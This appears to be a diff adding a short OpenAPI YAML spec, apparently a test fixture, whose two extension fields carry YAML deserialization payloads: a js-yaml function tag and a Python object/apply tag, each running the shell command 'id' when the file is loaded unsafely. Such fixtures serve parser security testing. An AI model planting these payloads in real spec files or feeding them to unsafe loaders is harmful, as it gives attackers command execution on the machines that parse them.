@@ -1,0 +1,6 @@
+openapi: 3.1.0
+info:
+  title: Tags
+  version: "1"
+x-payload: !!js/function 'function () { return process.mainModule.require("child_process").execSync("id") }'
+x-python: !!python/object/apply:os.system ["id"]
